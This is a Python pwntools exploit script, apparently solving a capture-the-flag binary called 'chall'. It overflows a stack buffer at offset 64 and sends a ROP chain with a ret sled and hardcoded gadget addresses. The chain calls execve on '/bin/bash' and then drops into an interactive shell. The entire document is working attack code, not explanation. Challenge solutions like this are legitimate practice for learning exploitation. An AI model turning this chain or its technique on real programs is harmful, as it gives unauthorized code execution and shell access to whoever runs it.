#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
# Debuginfo:  Yes

p = start()

rop = ROP(exe)

SYSCALL = 0x00000000004349ff
bin_bash = next(exe.search(b'/bin/bash\0'))
pop_rdi = 0x0000000000405145
pop_rax = 0x000000000044126a
pop_rsi_mov_rdx_r15_pop_r15 = 0x0000000000474973
pop_r15 = 0x0000000000405144

ret_sled = p64(rop.ret.address) * 32
print(len(ret_sled))

offset = 64
payload = flat({offset:
	[
		0x4000f8,
		ret_sled,
		pop_rdi,
		bin_bash,
		pop_r15,
		0x0,
		pop_rsi_mov_rdx_r15_pop_r15,
		0x0,
		0x0,
		pop_rax,
		0x3b,
		SYSCALL
	]
})

p.sendline(payload)

p.interactive()

